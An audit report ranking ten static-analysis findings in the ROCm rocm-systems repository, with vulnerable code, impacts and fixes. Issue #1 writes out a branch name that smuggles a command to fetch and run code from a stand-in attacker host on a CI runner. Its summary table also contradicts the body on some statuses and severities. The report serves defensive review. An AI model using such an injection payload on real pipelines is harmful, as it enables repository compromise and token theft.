# Top 10 Most Critical Issues

**Repository**: rocm-systems
**Date**: 2026-04-11
**Source**: Static analysis across 13 tools, ~199,000 raw findings
**Selection criteria**: Exploitability, blast radius, confidence, privilege level

---

## How We Ranked These

Each issue was scored on four dimensions:

| Criterion | Weight | Description |
|-----------|--------|-------------|
| **Exploitability** | 30% | Can an attacker trigger this? Is input external? |
| **Blast radius** | 30% | Silent data corruption in GPU runtime > crash > test failure |
| **Confidence** | 20% | Multiple tools agree? Code reviewed? Pattern confirmed? |
| **Privilege level** | 20% | Root daemon > library code > test code > example code |

---

## Issue #1: CI Script Command Injection via PR Branch Names — [Full Analysis](analysis-reports/critical/01-ci-command-injection.md)

**Status**: 🟢 **Fix submitted**: [ROCm/rocm-systems#4939](https://github.com/ROCm/rocm-systems/pull/4939)
**Severity**: CRITICAL
**File**: `.github/scripts/import_subrepo_prs.py:68`
**Tools**: bandit B602, B605 | Code review confirmed
**Exploitability**: HIGH — attacker creates PR with malicious branch name

### The Bug

```python
def run(cmd, **kwargs):
    subprocess.check_call(cmd, shell=True, **kwargs)  # line 9

# Later:
head_ref = pr.head.ref          # attacker-controlled branch name
run(f"git subtree pull --prefix={prefix} {head_url} {head_ref}")  # line 68
```

An external contributor creates a PR with branch name:
```
feat/x$(curl attacker.com/pwn|sh)
```

The `shell=True` subprocess expands this, executing arbitrary commands on the GitHub Actions runner with access to `GITHUB_TOKEN` and repository write permissions.

### Impact
- Full repository compromise (push to any branch, delete branches)
- Exfiltration of `GITHUB_TOKEN` and any other CI secrets
- Supply chain attack vector (inject malicious code into releases)

### Fix
```python
def run(cmd_list, **kwargs):
    subprocess.check_call(cmd_list, **kwargs)  # shell=False, list args

run(["git", "subtree", "pull", f"--prefix={prefix}", head_url, head_ref])
```

Also affects: `pr_category_label.py:91,96,97`, `pr_detect_changed_subtrees.py:115,120`

---

## Issue #2: HMAC Key File Permission Race (TOCTOU) in cuid Daemon — [Full Analysis](analysis-reports/critical/02-cuid-chmod-toctou.md)

**Status**: 🟢 **Fix submitted**: [ROCm/rocm-systems#4940](https://github.com/ROCm/rocm-systems/pull/4940)
**Severity**: CRITICAL
**File**: `projects/cuid/lib/src/hmac.cc:163`
**Tools**: flawfinder (level 5) | Code review confirmed
**Exploitability**: MEDIUM — requires local access, daemon runs as root

### The Bug

```cpp
key_file.write(reinterpret_cast<const char*>(key), key_length);
key_file.close();
// WINDOW: between close() and chmod(), attacker swaps path with symlink
if (chmod(key_file_path.c_str(), S_IRUSR | S_IWUSR) != 0) {
    return AMDCUID_STATUS_PERMISSION_DENIED;
}
```

Between `close()` and `chmod()`, an attacker can replace `key_file_path` with a symlink to any file. The `chmod` then changes permissions on the attacker's target file. Since cuid runs as a privileged daemon handling HMAC keys, this is a privilege escalation vector.

### Impact
- Attacker can change permissions on arbitrary files (e.g., `/etc/shadow`)
- Key material could be written to attacker-controlled location via symlink

### Fix
```cpp
int fd = open(key_file_path.c_str(), O_WRONLY | O_CREAT | O_EXCL | O_NOFOLLOW, S_IRUSR | S_IWUSR);
// write key via fd, not via path
// no separate chmod needed — permissions set at creation
```

Also affects: `cuid/lib/src/cuid_file.cc:606,609`, `amdsmi/rocm_smi/src/rocm_smi_logger.cc:502`, `amdsmi/rocm_smi/src/rocm_smi_utils.cc:690`

---

## Issue #3: Buffer Overflow via sscanf Without Width Limits in amdsmi — [Full Analysis](analysis-reports/critical/03-sscanf-buffer-overflow.md)

**Status**: 🟢 **Fix submitted**: [ROCm/rocm-systems#4941](https://github.com/ROCm/rocm-systems/pull/4941) — also includes a secondary hardening of the container-ID extraction in `fdinfo.cc` (16-char truncation + unanchored match + no charset validation → anchored match + `[a-zA-Z0-9_-]` whitelist + 64-char cap matching moby/moby `fullLen`).
**Severity**: HIGH
**Files**: `projects/amdsmi/rocm_smi/src/rocm_smi.cc:7146,7325` + 20 more locations
**Tools**: flawfinder (level 4), cpplint | Code review confirmed
**Exploitability**: MEDIUM — input comes from sysfs/proc which could be influenced

### The Bug

```cpp
char task_name[256];
sscanf(message, "%x:%s\n", &pid, task_name);  // line 7146
```

`%s` in sscanf has no width limit. If `message` contains a string longer than 255 characters after the hex value, this overflows `task_name` on the stack.

### Impact
- Stack buffer overflow — potential code execution
- amdsmi runs as a system management library, often with elevated privileges
- The `message` data comes from reading `/proc/*/maps` and sysfs files

### Fix
```cpp
sscanf(message, "%x:%255s\n", &pid, task_name);
// Or better: use C++ std::istringstream
```

Full list of affected locations (22 total):
- `rocm_smi.cc:7146,7325`
- `amd_smi.cc:5478`
- `amd_smi_utils.cc:356,386,582,585`
- `fdinfo.cc:161,171,176,181,186,190`
- `rocm_smi_binary_parser.cc:82,84,198` (sprintf)

---

## ~~Issue #4: memcpy Copying Pointer Size Instead of Data (100 locations)~~ — Dismissed after review — [Full Analysis](analysis-reports/critical/04-memcpy-sizeof-pointer.md)

**Status**: 🔵 **Dismissed** — all 100 findings manually verified, **0 confirmed bugs**. Two independent reviews (2026-04-11 and 2026-04-12).
**Severity**: ~~HIGH~~ → **LOW** (downgraded)
**Files**: 100 semgrep findings across multiple projects
**Tools**: semgrep-cpp (memcpy-sizeof-pointer rule)
**Exploitability**: N/A — no real bugs present

### The Bug (theoretical)

```cpp
memcpy(dst, src, sizeof(ptr));  // copies 8 bytes (pointer size on x64)
// Should be:
memcpy(dst, src, sizeof(*ptr)); // copies actual data size
```

### Outcome of review

100 semgrep findings were manually verified against the source. Classification:

| Category | Count | Status |
|---|---|---|
| `sizeof(TypeName)` — named struct/union/scalar type | 33 | SAFE |
| `sizeof(local_struct_variable)` — struct/union instance | 19 | SAFE |
| `sizeof(fixed_array)` — local or member array | 12 | SAFE |
| `sizeof(scalar_variable)` — int, uint64_t, etc. | 10 | SAFE |
| `sizeof(template_param)` — template T | 5 | SAFE |
| `sizeof(*pointer)` — correctly dereferenced | 3 | SAFE |
| Phantom findings (file:line has no memcpy) | 18 | Tool bug |
| **Confirmed `sizeof(pointer)` bugs** | **0** | — |

### Notes

- The semgrep rule `memcpy-sizeof-pointer` pattern-matches syntactically on `sizeof($IDENT)` inside `memcpy`, with no type resolution, so it fires on every struct/array/scalar/template-param identifier. Estimated true-positive rate on this codebase: **0%**.
- 18 phantom findings point to lines that contain no `memcpy` at all (file too short, wrong extension, etc.) — a separate bug in the rule/runner worth reporting upstream.
- **Do NOT add this rule to blocking CI.** Consider replacing with a type-aware equivalent in clang-tidy or cppcheck if the check is valuable.

---

## Issue #5: Dangling .c_str() — Use-After-Free (59 locations) — [Full Analysis](analysis-reports/critical/05-dangling-cstr.md)

**Status**: 🟢 **Fix submitted**: [ROCm/rocm-systems#4951](https://github.com/ROCm/rocm-systems/pull/4951) — same public-API anti-pattern in three profiler `error_string` functions; fixed with call-site `thread_local` copy (strerror/dlerror-style contract) + GTest regressions in all three projects. 30 false positives + 26 phantom findings dismissed after two independent reviews (2026-04-11, 2026-04-12).
**Severity**: ~~HIGH~~ → **MEDIUM** (real issues are public API contract violations, not immediate crashes)
**Files**: 59 semgrep findings → 3 real, across 3 files
**Tools**: semgrep-cpp (dangling-c-str rule)
**Exploitability**: LOW — latent UAF in error-string APIs; would need a caller to retain the pointer across another log call on the same thread

### The real bug (3 instances, identical pattern)

```cpp
PUBLIC_API hsa_status_t *_error_string(const char** str) {
  *str = Logger::LastMessage().c_str();   // pointer escapes into caller
  return HSA_STATUS_SUCCESS;
}
```

`LastMessage()` returns `const std::string&` to a thread-local map entry (`logger.message_[GetTid()]`). The returned `const char*` is written to the caller's `*str` and has no documented lifetime — it becomes invalid as soon as that thread logs again.

Locations:
- `projects/aqlprofile/src/core/aql_profile.cpp:195`
- `projects/rocprofiler/src/core/rocprofiler.cpp:481`
- `projects/rocprofiler-sdk/source/lib/aqlprofile/core/aql_profile.cpp:235`

Fix applied in [#4951](https://github.com/ROCm/rocm-systems/pull/4951): copy the logger's last message into a call-site `thread_local std::string` and return its `c_str()`. The returned pointer is now stable until the next `*_error_string` call on the same thread — the same contract `strerror(3)` / `dlerror(3)` provide. No ABI change; no caller-side free required.

### Outcome of review

| Category | Count |
|---|---|
| SAFE — `.str().c_str()` passed to immediate consumer (strncpy/fopen/printf/setenv/strdup/stat/ifstream/system) | 22 |
| SAFE — named local `.c_str()` consumed in same expression | 3 |
| SAFE — `.c_str()` in string assignment context (copies) | 1 |
| SAFE — `.c_str()` on named member / `what()` / local param | 4 |
| Phantom findings (file:line has no `.c_str()`) | 26 |
| **Real SUSPECT findings** | **3** |

### Notes

- Phantom rate is **44% (26/59)** — semgrep is reporting wrong file extensions (`.c` vs `.cpp`), lines beyond file length, or lines with no `.c_str()` at all. Worse than the memcpy rule's 18%. Worth reporting upstream.
- The 3 real findings are in public APIs published via `hsa_ven_amd_aqlprofile_error_string` / `rocprofiler_error_string`; fix landed as [#4951](https://github.com/ROCm/rocm-systems/pull/4951).
- **Signal-to-noise takeaway**: ~200 semgrep dangling-`c_str` findings → **3 real bugs (~1.5%)**. Extrapolating that hit rate across the full ~20k cross-tool finding backlog is not rigorous (different rules have very different precision, and semgrep's phantom rate here was 44%), but it does set an informative lower bound: even at 1% real-bug density, there are ~200 more real bugs still buried in the noise. Triage throughput, not detection, is now the bottleneck. Prioritize rules with lower phantom/false-positive rates and public-API / root-daemon / kernel-adjacent paths for the next passes.

---

## Issue #6: Unchecked HIP API Returns in Core Runtime (rccl, rocshmem) — [Full Analysis](analysis-reports/critical/06-unchecked-hip-returns.md)

**Status**: 🔵 Triaged, no action required — 0 real bugs in scope
**Severity**: HIGH (as classified by the rule); effective severity LOW after review
**Scope reviewed**: 65 production findings in `projects/rccl` (26) and `projects/rocshmem` (42) — **not** the ~300 quoted originally (see "Count correction" below)
**Tools**: hip-check + semgrep-cpp (hip-unchecked-malloc, hip-unchecked-memcpy, hip-unchecked-launch)
**Exploitability**: N/A — correctness/reliability

### The Bug (as the rule would catch it)

```cpp
hipMalloc(&dev_ptr, size);      // returns hipErrorOutOfMemory — IGNORED
hipMemcpy(dst, src, size, ...); // returns hipErrorInvalidValue — IGNORED
kernel<<<grid, block>>>(...);   // launch may fail — IGNORED
```

HIP API calls return `hipError_t`. If the result is dropped, failures become silent: null pointers, stale/zero buffers, missing kernel output.

### Outcome of review (2026-04-13)

| Category | Count | Disposition |
|---|---|---|
| `rccl/src` — wrapped in `CUDACHECK` macro (`src/include/checks.h`) | 1 | false-positive (macro wraps the call) |
| `rccl/tools/**` — wrapped in `HIP_CALL` macro (per-tool) | 13 | false-positive |
| `rccl/tools/p2p-latency-test` — wrapped in `HIPCHECK` macro | 4 | false-positive |
| `rccl/tools/ib-test/ib_test.cpp` — bare kernel launch, deferred `CUDACHECK(hipDeviceSynchronize)` at lines 622/645 | 2 | false-positive (standard deferred-error pattern in a microbenchmark) |
| `rccl/tools/JitterBench` — bare kernel launch, deferred `HIP_CALL(hipStreamSynchronize)` ~10 lines below; malloc/memcpy are `HIP_CALL`-wrapped | 3 | false-positive |
| `rocshmem/src/**` and `rocshmem/examples/**` — wrapped in `CHECK_HIP` macro (`src/util.hpp`, aborts on failure) | 42 | false-positive |
| **Total in scope** | **65** | **0 real bugs** |

All 65 are now recorded as pattern-glob anomalies in [`.analysis/anomalies.toml`](.analysis/anomalies.toml) with `code_anchor` matching the wrapping macro, so subsequent analysis runs auto-suppress them. The triage workflow is documented in [`.analysis/README.md`](.analysis/README.md).

### Count correction

The original "~300 non-test locations in clr (150), rccl (128), rocshmem (74)" reflected a pre-filter count. After filtering to the three specific check-IDs that define this issue, in the four core-runtime projects:

- **clr**: 0 findings (the rule doesn't match this codebase — CLR uses `ihipMalloc`-style internal APIs that the rule doesn't recognise)
- **rccl**: 26 production findings (all false-positive — see table)
- **rocshmem**: 42 production findings (all false-positive — `CHECK_HIP` wrapper)
- **rocr-runtime**: 0 (uses the HSA API, not HIP; rule does not apply)

**Total: 65 production findings, 0 real bugs.** Out-of-scope sibling findings (in `hip-tests/`, `rocprofiler-systems/` examples, etc.) remain un-triaged and may still contain real issues — those are deferred to a separate pass.

### ⏭️ Deferred follow-up: Issue #6b — hip-tests (~3,700 findings)

**Status**: 📋 To do — the larger and tedious half of this class of findings.

`projects/hip-tests/` contributes on the order of 3,700 findings across the same three check-IDs. They were deliberately left out of the primary pass because:

- They're test code, not production library code — the consequence of an unchecked HIP call in a test is usually "test aborts loudly" rather than "user data silently corrupted", so the real-bug yield is expected to be lower than the 1.1% baseline (ballpark 5–30 real issues, mostly "test silently passes when it should fail").
- Test suites tend to reuse a small number of error-checking macros (`HIP_CHECK`, `HIPCHECK`, `HIPRT_CHECK`, Catch2 section expansions, etc.). Most findings should collapse into a handful of pattern-glob anomalies — tedious to enumerate, cheap per glob.

**Approach when we return:**

1. Extract the 3,700 to a worklist and bucket by `(file, check_id)` and `(subdir, check_id)` — no decisions, just inventory.
2. Write globs for the dominant buckets (expect the top ~10 buckets to cover the majority).
3. Review the long tail individually — that's where any real bugs will be.
4. **Highest-ROI follow-up**: teach `nix/analysis/rules/semgrep-hip.yaml` to recognise the wrapping macros (`CUDACHECK`, `HIP_CALL`, `HIPCHECK`, `CHECK_HIP`, and the hip-tests equivalents). Permanently drops the next run's noise floor on this rule class from thousands to low hundreds.

Tracking this as **#6b** rather than a new top-ten slot because the rule + scope are the same as #6; only the subtree is different.

### What this tells us

- The rule is noisy on rccl/rocshmem because both projects have mature, consistent error-checking macros the rule doesn't recognise. An obvious rule improvement: teach semgrep-hip to treat `CUDACHECK(...)`, `HIP_CALL(...)`, `CHECK_HIP(...)` as checked calls. Tracked as a follow-up to this pass.
- Real risk for this class is more likely to live in example/sample code (e.g. `rocprofiler-systems/.../transpose.new.cpp`) and ad-hoc scripts, not in the core runtime libraries. A follow-up triage pass should target those.
- **Signal-to-noise update**: Issue #5 found 3 real / ~200 findings (~1.5%). Issue #6 found 0 real / 65. Combined so far: 3 real / ~265 (~1.1%). The 1%-ish extrapolation for the full ~20 k backlog is holding.

---

## Issue #7: HIP Double-Free on GPU Memory (11 locations) — [Full Analysis](analysis-reports/critical/07-hip-double-free.md)

**Severity**: HIGH
**Files**: 11 locations, primarily in hip-tests but pattern may exist in runtime
**Tools**: hip-check (hip-double-free rule)
**Exploitability**: N/A — crash/corruption

### The Bug

```cpp
hipFree(dev_ptr);
// ... some code paths ...
hipFree(dev_ptr);  // double-free
```

Calling `hipFree` twice on the same pointer corrupts the GPU memory allocator. The same GPU memory may be returned by a subsequent `hipMalloc`, leading to two different buffers aliasing the same physical memory.

### Impact
- GPU memory corruption
- Two kernels writing to the same physical memory simultaneously
- Silent data corruption in AI/ML workloads
- Hard to diagnose — may only manifest under specific allocation patterns

### Fix
Set pointer to null after free: `hipFree(dev_ptr); dev_ptr = nullptr;`
Or use RAII wrappers that prevent double-free by design.

---

## Issue #8: SSL Certificate Verification Disabled in LLM Client — [Full Analysis](analysis-reports/critical/08-ssl-verify-disabled.md)

**Severity**: HIGH
**File**: `experimental/python/rocinsight/rocinsight/ai_analysis/interactive.py:4324`
**Tools**: bandit B501 | Code review confirmed
**Exploitability**: HIGH — network-level MITM

### The Bug

```python
client = httpx.Client(verify=False)  # SSL verification disabled
response = client.post(llm_endpoint, json={"prompt": source_code_context})
```

This sends GPU profiling data and source code snippets to an LLM API over an unverified HTTPS connection.

### Impact
- MITM attacker can intercept source code and profiling data
- Attacker can inject modified LLM responses (AI supply chain attack)
- The `ROCINSIGHT_LLM_PRIVATE_VERIFY_SSL=0` flag provides no runtime warning

### Fix
```python
# Default to verification enabled
verify = os.getenv("ROCINSIGHT_LLM_VERIFY_SSL", "1") != "0"
if not verify:
    warnings.warn("SSL verification disabled — LLM traffic is unprotected", stacklevel=2)
client = httpx.Client(verify=verify)
```

---

## Issue #9: Thread-Unsafe Functions in Multi-Threaded GPU Runtime — [Full Analysis](analysis-reports/critical/09-thread-unsafe-functions.md)

**Severity**: MEDIUM-HIGH
**Files**: 121 `strtok` + 86 `strerror` = 207 locations
**Tools**: cpplint (runtime/threadsafe_fn), semgrep-cpp (strerror-thread-unsafe)
**Exploitability**: N/A — data race / correctness

### The Bug

```cpp
// strtok uses global state — data race if called from multiple threads
char* token = strtok(line, ",");   // NOT thread-safe

// strerror returns pointer to shared static buffer
fprintf(stderr, "Error: %s\n", strerror(errno));  // NOT thread-safe
```

In a GPU runtime where multiple host threads manage different GPU devices and streams, these functions cause data races. `strtok` corrupts parse state across threads. `strerror` may return a string that another thread overwrites before it's used.

### Impact
- Corrupted parsed data (strtok)
- Wrong or garbled error messages (strerror)
- In GPU runtime context, may cause wrong device selection or configuration

### Fix
```cpp
char* token = strtok_r(line, ",", &saveptr);  // thread-safe
char buf[256]; strerror_r(errno, buf, sizeof(buf));  // thread-safe
```

---

## Issue #10: strncat Buffer Overflow in hip-tests — [Full Analysis](analysis-reports/critical/10-strncat-overflow.md)

**Severity**: MEDIUM-HIGH
**Files**: `projects/hip-tests/catch/unit/device/hipDeviceGetUuid.cc:150,240`, `getUUIDfrmRocinfo_Exe.cc:30`
**Tools**: flawfinder (level 5) | Code review confirmed
**Exploitability**: LOW — test code, but pattern may be copied

### The Bug

```cpp
char command[COMMAND_LEN];
// ... command partially filled ...
strncat(command, " | grep -i Uuid:", COMMAND_LEN);  // WRONG
```

`strncat`'s third argument should be the **remaining space** in the buffer, not the total buffer size. If `command` already contains data, this writes past the end of the buffer.

The correct form:
```cpp
strncat(command, " | grep -i Uuid:", COMMAND_LEN - strlen(command) - 1);
// Or better: snprintf
```

### Impact
- Stack buffer overflow in test executable
- Test code patterns get copied into production code
- CWE-120: Buffer Copy without Checking Size of Input

### Fix
Replace `strncat` with `snprintf`:
```cpp
snprintf(command + strlen(command), COMMAND_LEN - strlen(command),
         " | grep -i Uuid:");
```

---

## Summary Table

| # | Issue | Severity | Type | Location | Effort | Status |
|---|-------|----------|------|----------|--------|--------|
| 1 | CI command injection | CRITICAL | Security | .github/scripts/ | 1 hour | 🟢 [PR #4939](https://github.com/ROCm/rocm-systems/pull/4939) |
| 2 | HMAC key chmod TOCTOU | CRITICAL | Security | cuid daemon | 2 hours | 🟢 [PR #4940](https://github.com/ROCm/rocm-systems/pull/4940) |
| 3 | sscanf buffer overflow | HIGH | Security | amdsmi (22 locations) | 4 hours | ⚪ Open |
| 4 | memcpy sizeof(ptr) | HIGH | Correctness | 100 locations | 8 hours | ⚪ Open |
| 5 | Dangling .c_str() | HIGH | Correctness | 3 real / 59 raw | 4 hours | 🟢 [#4951](https://github.com/ROCm/rocm-systems/pull/4951) |
| 6 | Unchecked HIP returns (core runtime) | HIGH | Correctness | 0 real / 65 in-scope (all macro-wrapped) | Triaged | 🔵 Triaged — [`.analysis/anomalies.toml`](.analysis/anomalies.toml) |
| 6b | Unchecked HIP returns (hip-tests) | MEDIUM | Correctness | ~3,700 test-code findings, un-triaged | TBD | 📋 Deferred — see §6 |
| 7 | HIP double-free | HIGH | Correctness | 11 locations | 2 hours | ⚪ Open |
| 8 | SSL verify=False | HIGH | Security | rocinsight LLM client | 1 hour | ⚪ Open |
| 9 | Thread-unsafe functions | MEDIUM-HIGH | Correctness | 207 locations | 8 hours | ⚪ Open |
| 10 | strncat overflow | MEDIUM-HIGH | Security | hip-tests (3 locations) | 1 hour | ⚪ Open |

**Estimated total effort**: ~47 hours for all 10 issues.
**Issues 1, 2, 8**: Can be fixed in a single afternoon — highest ROI.
**Issue 6**: Largest effort but highest blast radius for AI/ML correctness.
